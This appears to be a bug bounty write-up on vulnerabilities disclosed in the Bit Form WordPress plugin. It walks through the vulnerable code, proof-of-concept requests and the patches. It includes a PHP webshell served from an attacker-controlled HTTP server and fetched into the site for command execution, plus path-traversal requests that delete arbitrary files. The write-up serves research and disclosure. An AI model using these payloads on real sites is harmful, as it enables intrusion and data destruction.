# How I Found My First Vulnerabilities In 6 Different WordPress Plugins (Part 1)

## Table of Contents

  1. [Overview](#overview)  
  2. [Before Doing WordPress Plugin Bug Bounty](#before-doing-wordpress-plugin-bug-bounty)  
  3. [Authenticated (Administrator+) Arbitrary File Upload (CVE-2024-6123)](#authenticated-administrator-arbitrary-file-upload-cve-2024-6123)  
    3.1. [The Patch](#the-patch)  
    3.2. [Timeline](#timeline)  
  4. [Redacted](#redacted-cve-2024-)  
  5. [Authenticated (Administrator+) Arbitrary File Deletion (CVE-2024-7782)](#authenticated-administrator-arbitrary-file-deletion-cve-2024-7782)  
    5.1. [The Patch](#the-patch-1)  
    5.2. [Timeline](#timeline-1)  
  6. [Authenticated (Administrator+) Arbitrary File Read And Deletion (CVE-2024-7777)](#authenticated-administrator-arbitrary-file-read-and-deletion-cve-2024-7777)  
    6.1. [Arbitrary File Deletion](#arbitrary-file-deletion)  
      6.1.1 [Arbitrary File Deletion via Method `deleteBlukFormEntries`](#arbitrary-file-deletion-via-method-deleteblukformentries)  
      6.1.2 [Arbitrary File Deletion via Method `deleteBlukForm`](#arbitrary-file-deletion-via-method-deleteblukform)  
      6.1.3 [Arbitrary File Deletion via Method `deleteAForm`](#arbitrary-file-deletion-via-method-deleteaform)  
    6.2. [Arbitrary File Read](#arbitrary-file-read)  
      6.2.1 [Arbitrary File Read Bypass via Arbitrary File Deletion](#arbitrary-file-read-bypass-via-arbitrary-file-deletion)  
    6.3. [The Patch](#the-patch-2)  
    6.4. [Timeline](#timeline-2)  
  7. [Authenticated (Administrator+) SQL Injection (CVE-2024-7780)](#authenticated-administrator-sql-injection-cve-2024-7780)  
    7.1. [The Patch](#the-patch-3)  
    7.2. [Timeline](#timeline-3)  
  8. [Authenticated (Administrator+) SQL Injection via getLogHistory Function (CVE-2024-7702)](#authenticated-administrator-sql-injection-via-getloghistory-function-cve-2024-7702)  
    8.1. [The Patch](#the-patch-4)  
    8.2. [Timeline](#timeline-4)  
  9. [Authenticated (Administrator+) Arbitrary JavaScript File Uploads (CVE-2024-7775)](#authenticated-administrator-arbitrary-javascript-file-uploads-cve-2024-7775)  
    9.1. [The Patch](#the-patch-5)  
    9.2. [Timeline](#timeline-5)  
  10. [Conclusion](#conclusion)  

## Overview

This writeup is about how I found my first real world vulnerabilities across 6 different WordPress plugins. In the first part, I'll mainly talk about **7 vulnerabilities that I've found in WordPress plugin "[Bit Form](https://wordpress.org/plugins/bit-form/)", 1 of which was duplicated**. In the second part, I'll share some common pitfalls in using a PHP library, which eventually led me to find exactly the same vulnerabilities in 5 different WordPress plugins that use the same PHP library.

In this first part, I'll talk about how I found the following vulnerabilities in details:
1. \*[Authenticated (Administrator+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/bit-form-2122-authenticated-administrator-arbitrary-file-upload) ([CVE-2024-6123](https://www.cve.org/CVERecord?id=CVE-2024-6123))
2. Redacted (CVE-2024-????) (Waiting for public disclosure)
3. [Authenticated (Administrator+) Arbitrary File Deletion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2134-authenticater-administrator-arbitrary-file-deletion) ([CVE-2024-7782](https://www.cve.org/CVERecord?id=CVE-2024-7782))
4. [Authenticated (Administrator+) Arbitrary File Read And Deletion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2139-authenticated-administrator-arbitrary-file-read-and-deletion) ([CVE-2024-7777](https://www.cve.org/CVERecord?id=CVE-2024-7777))
5. [Authenticated (Administrator+) SQL Injection](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2139-authenticated-administrator-sql-injection) ([CVE-2024-7780](https://www.cve.org/CVERecord?id=CVE-2024-7780))
6. [Authenticated (Administrator+) SQL Injection via getLogHistory Function](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2139-authenticated-administrator-sql-injection-via-getloghistory-function) ([CVE-2024-7702](https://www.cve.org/CVERecord?id=CVE-2024-7702))
7. [Authenticated (Administrator+) Arbitrary JavaScript File Uploads](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2139-authenticated-administrator-arbitrary-javascript-file-uploads) ([CVE-2024-7775](https://www.cve.org/CVERecord?id=CVE-2024-7775))

> \* This vulnerability was first found by researcher [István Márton](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes), then I later discovered this vulnerability.

Without further ado, let's dive in!

## Before Doing WordPress Plugin Bug Bounty

After me and my teammates in [ARESx](https://ctftime.org/team/128734) solving [NahamCon CTF 2024](https://ctftime.org/event/2364) a challenge called "WP Elevator" (Writeup [here](https://siunam321.github.io/ctf/NahamCon-CTF-2024/Sponsorship/WP-Elevator/)), I was very curious about WordPress plugins security ecosystem. Upon researching, I found that [Patchstack](https://patchstack.com/) and [Wordfence](https://www.wordfence.com/) do have a bug bounty program for WordPress plugins and themes. Eventually in June 4th 2024, I posted [this Tweet](https://twitter.com/siunam321/status/1797965803641585749) and decided to hunt for vulnerabilities in WordPress plugins.

And of course, same as many beginners, I failed to find any vulnerabilities in 5 different plugins. Luckily, in around June 12th, Wordfence introduced the "0-day Threat Hunt", which means high severity vulnerabilities in plugins and themes with more than 1000 active installations are considered to be in-scope:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240821190940.png)

In Wordfence bug bounty program, there are 3 researcher tiers: "Standard Researchers", "Resourceful Researchers", and "1337 Researchers". Those tiers can be achieved by finding certain amounts of vulnerabilities or achieve a certain goal. For new starters, all of us are in tier "Standard Researchers". Before the "0-day Threat Hunt", normally only plugins/themes with more than 50000 active installations are in-scope targets. Lucky for me, it's not the case anymore! I can now start to hunt for vulnerabilities with a wider scope!

In July 2nd, I picked a plugin called "[Bit Form](https://wordpress.org/plugins/bit-form/)", which at the time of writing this writeup, it has 6000+ active installations and the latest version is 2.13.0. Then, as usual, I started to perform code review and hunt for bugs, just like how I solve a CTF web challenge!

## Authenticated (Administrator+) Arbitrary File Upload (CVE-2024-6123)

After poking around with this plugin, building forms, I slowly understood some features in the plugin. I then started one of my code review techniques: "[Sources and sinks model](https://www.youtube.com/watch?v=ZaOtY4i5w_U)", where **sources are user inputs, and sinks are dangerous functions**.

Now you may ask: What are the dangerous functions in PHP and WordPress plugin?

Fortunately, researcher István Márton posted a [Discord message](https://discord.com/channels/1197901373581303849/1199013923173712023/1253288200609337344) that contains some common sinks:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240821194002.png)

Nice! We can now search for common sinks!

> Note: I might post a version of mine for common sources and sinks if time is allowed!

After searching for sinks in LFI (Local File Inclusion) vulnerability, no luck. I then proceed to find sinks in arbitrary file upload vulnerabilities. Eventually, I found class `AdminAjax` public method `iconUpload`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240821194824.png)

At the first glance, it seems like **it doesn't have any protection to against users to upload arbitrary PHP files**:

```php
class AdminAjax
{
  [...]
  public function iconUpload()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $uploadDirInfo = wp_upload_dir();
      $wpUploadbaseDir = $uploadDirInfo['basedir'];
      $icnDir = $wpUploadbaseDir . DIRECTORY_SEPARATOR . 'bitforms' . DIRECTORY_SEPARATOR . 'icons';
      [...]
      $imageUrlData = file_get_contents($input->src);

      $filename = sanitize_file_name($input->id . '-' . basename($input->src));
      $uploaded = file_put_contents($icnDir . '/' . $filename, $imageUrlData);

      if ($uploaded) {
        $uploadedFile = BITFORMS_UPLOAD_BASE_URL . '/' . 'icons' . '/' . $filename;
        wp_send_json_success($uploadedFile, 200);
      }
    } else {
      [...]
    }
  }
```

As you can see, after verifying our nonce, our source `$input->src` is parsed to the PHP built-in function `file_get_contents` to fetch a remote resource. After reading the remote resource's contents, it'll parse the content to another PHP built-in function `file_put_contents`, which means the content will be written to path `$icnDir . '/' . $filename` (Path `/wp-content/uploads/bitforms/icons/<filename>`).

Since there's no validation to only allow image files to be written to the `icons` directory, we can literally use this method to **fetch a remote resource that contains PHP code, and then write that PHP code into the `icons` directory**.

But wait! How can we call this method?

If we search for `iconUpload`, we can see that **AJAX action `bitforms_icn_save_setting`** has this callback method:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_icn_save_setting', [$this, 'iconUpload']);
```

With that said, we can call this AJAX action with a valid nonce to upload arbitrary files!

Now, how can we generate a valid nonce that binds to action `bitforms_save`?

To find out, we can search for `bitforms_save` and we should be able to find this in `/wp-content/plugins/bit-form/includes/Admin/Admin_Bar.php`:

```php
class Admin_Bar
{
  [...]
  public function AdminAssets($current_screen)
  {
    [...]
    if (!defined('BITAPPS_DEV') || (defined('BITAPPS_DEV') && !BITAPPS_DEV)) {
      $build_hash = file_get_contents(BITFORMS_PLUGIN_DIR_PATH . '/build-hash.txt');
      wp_enqueue_script('index-BITFORM-MODULE', BITFORMS_ASSET_URI . "/main-{$build_hash}.js", [], null);
      wp_enqueue_style('bf-css', BITFORMS_ASSET_URI . "/main-{$build_hash}.css");
    }
    [...]
    $bits = [
      [...]
      'nonce'               => wp_create_nonce('bitforms_save'),
      [...]
    ]
    [...]
    $bitforms = apply_filters(
      'bitforms_localized_script',
      $bits
    );
    [...]
    wp_localize_script('index-BITFORM-MODULE', 'bits', $bitforms);
```

In here, we can see that class `Admin_Bar` public method `AdminAssets` uses WordPress function `wp_enqueue_script` to register a JavaScript file, and its handle is called `index-BITFORM-MODULE`. In this JavaScript, it contains a new nonce that binds to action `bitforms_save`, which is generated via `wp_create_nonce`.

Again, tracing back how this method is being called, we can find that this is the callback method of action `admin_enqueue_scripts`:

```php
class Admin_Bar
{
  public function register()
  {
    [...]
    add_action('admin_enqueue_scripts', [$this, 'AdminAssets']);
  }
```

If we read [the documentation of WordPress hook `admin_enqueue_scripts`](https://developer.wordpress.org/reference/hooks/admin_enqueue_scripts/), it says "Fires when enqueuing scripts for all admin pages."

Again, tracing back how this public method `register` is being called, we can find that this method is called via class `Hooks` public method `init_classes`:

```php
[...]
use BitCode\BitForm\Core\Capability\Request;
[...]

class Hooks
{
  [...]
  public static function init_classes()
  {
    if (Request::Check('admin')) {
      (new Admin_Bar())->register();
    }
    [...]
  }
```

Eventually, we'll find that we can get a valid nonce in the **Bit Form admin page**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240821204556.png)

Nice! We can now test for it!

First, we host a PHP webshell file via Python module `http.server`:

```shell
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-upload)-[2024.08.21|20:48:30(HKT)]
└> ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.69.96.69  netmask 255.255.255.0  broadcast 10.69.96.255
        [...]
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-upload)-[2024.08.21|20:48:32(HKT)]
└> echo -n '<?php system($_GET["cmd"]); ?>' > webshell.php
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-upload)-[2024.08.21|20:48:52(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Then, send a POST request to `/wp-admin/admin-ajax.php` with GET parameter `action`, `_ajax_nonce`, and JSON object attribute `src` that points to our HTTP server:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_icn_save_setting&_ajax_nonce=5bb5d043b8 HTTP/1.1
Host: localhost
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724412605%7CrwbMC64aqDEgN54rhgVKKkWAMiTmYSeFVF3Krk8UlPK%7C74a392fa0d19e2134f69822e321e4ce34145356de815964c65020c6715df5d13; wp-settings-time-1=1724241516; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724412605%7CrwbMC64aqDEgN54rhgVKKkWAMiTmYSeFVF3Krk8UlPK%7C392d7068610920f89b32627fd8b31d70e308941a8f8c15ed2a6d9aff0923c958
Content-Type: text/plain;charset=UTF-8
Content-Length: 46

{"src":"http://10.69.96.69:8000/webshell.php"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240821205417.png)

Finally, we should be able to execute OS commands in our uploaded PHP webshell file!

```shell
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-upload)-[2024.08.21|20:51:09(HKT)]
└> curl --get http://localhost/wp-content/uploads/bitforms/icons/webshell.php --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice!!

Unfortunately, this vulnerability is out-of-scope, as **it requires administrator+ privilege** to exploit it. I tried to find all possible ways to exploit it in an unauthenticated/low privilege users, but no luck. After writing the Proof-of-Concept script, I reported this vulnerability to Wordfence in July 3rd, 2024 at 5:22 PM (UTC+8).

After 6 hours of reporting, I was notified by Wordfence that this vulnerability had been found by researcher István Márton and treated this report as duplicate. Ah, darn it! Let's move on and keep finding even more vulnerabilities!

### The Patch

To fix this vulnerability is very straight forward. Just validate the remote fetched resource's extension is an image and MIME type is `image/.*`.

Based on the version 2.13.4 [revision log](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3114814%40bit-form%2Ftrunk%2Fincludes%2FAdmin%2FAdminAjax.php&old=3109667%40bit-form%2Ftrunk%2Fincludes%2FAdmin%2FAdminAjax.php&sfp_email=&sfph_mail=), we can see now the method is **validating the extension and MIME type** of the remote resource via WordPress function `wp_check_filetype`:

```php
class AdminAjax
{
  [...]
  public function iconUpload()
  {
    [...]
    $validation = wp_check_filetype($filename);
    $type = $validation['type'];

    if ($type && 0 === strpos($type, 'image/')) {
      $uploaded = file_put_contents($icnDir . '/' . $filename, $imageUrlData);
      [...]
    } else {
      [...]
    }
```

> Note: WordPress function `wp_check_filetype` also check whether the file extension matches the MIME type. If it's not match, both array `type` and `ext` will return `false`. You can check it out in [the documentation's "Source" section](https://developer.wordpress.org/reference/functions/wp_check_filetype/#source).

### Timeline

- Reported the vulnerability to Wordfence in July 3rd, 2024 at 5:22 PM (UTC+8)
- Wordfence marked the report as duplicate in July 3rd, 2024 at 11:16 PM (UTC+8)
- Wordfence publicly disclosed the vulnerability in July 8th, 2024
- Bit Form version 2.13.4 was released in July 9th, 2024

## Redacted (CVE-2024-????)

I found another vulnerability during writing this writeup. I'll update this section once it's publicly disclosed.

## Authenticated (Administrator+) Arbitrary File Deletion (CVE-2024-7782)

After finding an arbitrary file upload vulnerability, I decided to look for arbitrary file deletion. As usual, I searched for common sinks for file deletion, such as `unlink()`, `wp_delete_file()`.

Well surprise, there's an `unlink()` sink literally 2 methods below `iconUpload`. That method is called `iconRemove`!

```php
class AdminAjax
{
  [...]
  public function iconRemove()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);

      $uploadDirInfo = wp_upload_dir();

      $wpUploadbaseDir = $uploadDirInfo['basedir'];
      $icnDir = $wpUploadbaseDir . DIRECTORY_SEPARATOR . 'bitforms' . DIRECTORY_SEPARATOR . 'icons' . DIRECTORY_SEPARATOR;
      if (file_exists($icnDir . $input->file)) {
        unlink($icnDir . $input->file);
        wp_send_json_success($this->getFiles(), 200);
      }
    } else {
      [...]
    }
  }
```

In here, the sink is `unlink()`, which allows this method to delete a file. Then, the source is our **JSON attribute value `file`**. Since there's no sanitization over the `file` value, we can perform **path traversal** to delete any files on the file system!

By searching the method name, we can know that this method was used in AJAX action `bitforms_icon_remove`:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_icon_remove', [$this, 'iconRemove']);
```

With that said, once we have a valid nonce, we can delete any files on the file system!

Let's try that!

First, create a test file in the Docker container:

```shell
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-delete)-[2024.08.22|16:30:16(HKT)]
└> docker container list                                            
CONTAINER ID   IMAGE                               COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMES
9e2f4f189063   wordpress-local-testing-wordpress   "docker-entrypoint.s…"   39 minutes ago   Up 39 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp                                                      wordpress-wpd
[...]
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-delete)-[2024.08.22|16:30:16(HKT)]
└> docker exec -it 9e2f4f189063 bash
root@9e2f4f189063:/var/www/html# echo -n 'test' > test.txt
root@9e2f4f189063:/var/www/html# chown www-data:www-data test.txt
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
-rw-r--r-- 1 www-data www-data 4 Aug 22 08:31 test.txt
```

Then, send the following POST request to `/wp-admin/admin-ajax.php`:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_icon_remove&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 65
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"file":"../../../../../../../../../../../var/www/html/test.txt"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822163329.png)

Now the test file should be deleted, right?

```shell
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
-rw-r--r-- 1 www-data www-data 4 Aug 22 08:31 test.txt
```

Huh? It's still there?

Let's take a step back and take a look at the full path.

In the `iconRemove` method, the `$icnDir` is constructed like this:

```php
$uploadDirInfo = wp_upload_dir();

$wpUploadbaseDir = $uploadDirInfo['basedir'];
$icnDir = $wpUploadbaseDir . DIRECTORY_SEPARATOR . 'bitforms' . DIRECTORY_SEPARATOR . 'icons' . DIRECTORY_SEPARATOR;
```

In WordPress function [`wp_upload_dir`](https://developer.wordpress.org/reference/functions/wp_upload_dir/), it returns the current upload directory’s path and URL. Usually it's at `/var/www/html/wp-content/uploads/<current_year>/<current_month>`. After getting the WordPress upload directory path, it takes the `basedir` of `wp_upload_dir`, which is `/var/www/html/wp-content/uploads/`, and append it with `DIRECTORY_SEPARATOR . 'bitforms' . DIRECTORY_SEPARATOR . 'icons' . DIRECTORY_SEPARATOR`. According to [PHP Predefined Constants](https://www.php.net/manual/en/dir.constants.php), the `DIRECTORY_SEPARATOR` means string `/` on Linux and `\` on Windows.

Hence, **the final constructed path in `$icnDir` is `/var/www/html/wp-content/uploads/bitforms/icons/`**.

Now, if we look at directory `/var/www/html/wp-content/uploads/bitforms/`, **the `icons` directory doesn't exist by default**!

```shell
root@9e2f4f189063:/var/www/html# ls -lah wp-content/uploads/bitforms/
total 20K
drwxr-xr-x 4 www-data www-data 4.0K Aug 22 08:21 .
drwxr-xr-x 5 www-data www-data 4.0K Aug 22 08:21 ..
drwxr-xr-x 2 www-data www-data 4.0K Aug 22 08:26 form-styles
-rw-r--r-- 1 www-data www-data    6 Aug 22 08:21 index.php
drwxr-xr-x 3 www-data www-data 4.0K Aug 22 08:26 uploads
```

Hmm... It actually makes sense why we can't delete any files using path traversal, because the `icons` directory doesn't exist. Since the directory doesn't exist, Linux can't resolve the real path of the file. We can try that:

```shell
root@9e2f4f189063:/var/www/html# rm /var/www/html/doesnt_exist/../test.txt
rm: cannot remove '/var/www/html/doesnt_exist/../test.txt': No such file or directory
```

Huh, okay. Are there any ways to **create directory `icons` at path `/var/www/html/wp-content/uploads/bitforms/`**?

Well, yes there's a way to create that directory!

If we look back to method `iconUpload`, we can see the following lines:

```php
class AdminAjax
{
  [...]
  public function iconUpload()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      [...]
      $uploadDirInfo = wp_upload_dir();
      $wpUploadbaseDir = $uploadDirInfo['basedir'];
      $icnDir = $wpUploadbaseDir . DIRECTORY_SEPARATOR . 'bitforms' . DIRECTORY_SEPARATOR . 'icons';
      if (!is_dir($icnDir)) {
        mkdir($icnDir);
      }
```

As you can see, if directory `$icnDir` doesn't exist, it'll create that directory using PHP built-in function `mkdir`. Nice!

With that being said, we can **first create directory `icons` using method `iconUpload`**, then delete any files via method `iconRemove`.

Let's test it again!

```http
POST /wp-admin/admin-ajax.php?action=bitforms_icn_save_setting&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 65
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"src":"anything"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822165256.png)

```http
POST /wp-admin/admin-ajax.php?action=bitforms_icon_remove&_ajax_nonce=56951b1f2d HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 65
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7C2ed64b58bd1e6545e080831efa73208d7cd7a7d7db74f82d917bf1d084221f56; wp-settings-time-1=1724314921; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724485955%7C3MuslQ6YljdYmnUlWZHpXwkZNaOrPk5joqULpXwVLYr%7Cc3ff3cd5203d9aa8bd10333b517737a257f01a675a5701cfae83a2855c027d65; PHPSESSID=btmj60280414pvpn1970aan8n7

{"file":"../../../../../../../../../../../var/www/html/test.txt"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822165311.png)

```shell
root@9e2f4f189063:/var/www/html# ls -lah test.txt 
ls: cannot access 'test.txt': No such file or directory
```

Let's go!

### The Patch

Based on the version 2.13.5 [revision log](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3114994%40bit-form%2Ftrunk%2Fincludes%2FAdmin%2FAdminAjax.php&old=3109667%40bit-form%2Ftrunk%2Fincludes%2FAdmin%2FAdminAjax.php&sfp_email=&sfph_mail=), we can see now the method is **sanitizing the `file` JSON attribute value** via WordPress function `sanitize_file_name`:

```php
class AdminAjax
{
  [...]
  public function iconRemove()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      [...]
      $sanitizeFileName = sanitize_file_name($input->file);
      $filePath = $icnDir . $sanitizeFileName;
      if (file_exists($filePath)) {
        wp_delete_file($filePath);
        wp_send_json_success($this->getFiles(), 200);
      }
    } else {
      [...]
    }
  }
```

### Timeline

- Reported the vulnerability to Wordfence in July 3rd, 2024 at 7:18 PM (UTC+8)
- Bit Form version 2.13.5 was released in July 9th, 2024
- Wordfence started the triage process in August 7th, 2024 at 5:52 PM (UTC+8)
- Wordfence assigned CVE ID "CVE-2024-7782" in August 13th, 2024 at 7:20 AM (UTC+8)
- Wordfence publicly disclosed the vulnerability in August 19th, 2024 at 11:03 PM (UTC+8)

## Authenticated (Administrator+) Arbitrary File Read And Deletion (CVE-2024-7777)

After reported the arbitrary file upload and deletion in `iconUpload` and `iconRemove`, I decided to find another file delete and read sinks. Ultimately, I found 4 methods in class `AdminFormHandler` that used a sink, which were `deleteBlukFormEntries`, `deleteBlukForm`, `deleteAForm`, and `duplicateFormEntry`.

### Arbitrary File Deletion

Let's talk about **arbitrary file deletion** first.

If we search for arbitrary file deletion sinks, such as `unlink`, we'll find **class `FileHandler` method `rmrf`**:

```php
final class FileHandler
{
  public function rmrf($dir)
  {
    if (is_dir($dir)) {
      $objects = scandir($dir);
      foreach ($objects as $object) {
        if ('.' !== $object && '..' !== $object) {
          if (is_dir($dir . DIRECTORY_SEPARATOR . $object) && !is_link($dir . DIRECTORY_SEPARATOR . $object)) {
            $this->rmrf($dir . DIRECTORY_SEPARATOR . $object);
          } else {
            unlink($dir . DIRECTORY_SEPARATOR . $object);
          }
        }
      }
      rmdir($dir);
    } else {
      unlink($dir);
    }
  }
```

As the method name suggested, it's similar to the **Linux's `rm -rf` command**, which **recursively deletes files**.

With that being said, let's search where does this method is being used.

If we search for method `rmrf`, we'll find that it has been used in 3 different methods in class `AdminFormHandler`, which were: `deleteBlukFormEntries`, `deleteBlukForm`, and `deleteAForm`.

#### Arbitrary File Deletion via Method `deleteBlukFormEntries`

```php
class AdminFormHandler
{
  [...]
  public function deleteBlukFormEntries($Request, $post)
  {
    if (isset($Request['formID'])) {
      $formID = wp_unslash($Request['formID']);
      $entries = wp_unslash($Request['entries']);
    } else {
      $formID = wp_unslash($post->formID);
      $entries = wp_unslash($post->entries);
    }
    if (is_null($formID) || !is_array($entries) || 0 === count($entries)) {
      return new WP_Error('empty_form', __('Invalid Form ID or Entries ID.', 'bit-form'));
    }
    $formManager = new AdminFormManager($formID);
    if (!$formManager->isExist()) {
      return new WP_Error('empty_form', __('Form does not exist.', 'bit-form'));
    }
    [...]
    if (file_exists(BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $formID)) {
      $fileHandler = new FileHandler();
      foreach ($entries as $enrtyKey => $entryID) {
        $fileEntries = BITFORMS_UPLOAD_DIR . DIRECTORY_SEPARATOR . $formID . DIRECTORY_SEPARATOR . $entryID;
        if (file_exists($fileEntries)) {
          $fileHandler->rmrf($fileEntries);
        }
      }
    }
    [...]
  }
```

As you can see, if the source **`formID`** form exist, it'll call method `rmrf` to delete everything inside the `formID` directory.

Hmm... If we can control `formID` and `entryID`, we could try to do a path traversal to delete any files in the file system!

By tracing back how this method `deleteBlukFormEntries` is being called, we'll find that it's from class `AdminAjax` method `deleteBlukFormEntries`. (Yes, they have the same method name):

```php
class AdminAjax
{
  [...]
  public function deleteBlukFormEntries()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formHandler = FormHandler::getInstance();
      $status = $formHandler->admin->deleteBlukFormEntries($_REQUEST, $input);
      [...]
    } else {
      [...]
    }
  }
```

Which again, it's used by AJAX action `bitforms_bulk_delete_form_entries`:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_bulk_delete_form_entries', [$this, 'deleteBlukFormEntries']);
```

Just like the previous vulnerabilities, the source is **our POST request's JSON body data**. Therefore, we can provide a valid `formID` and with a path traversal payload in array `entries` to delete arbitrary files.

> Note: Class `AdminFormHandler` method `deleteBlukFormEntries` also validate the `entries` must be an array.

Now, how can we create a form?

If we go to the Bit Form plugin page, we can click the "Create First Form" button to create a new blank form:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822191602.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822191619.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822191742.png)

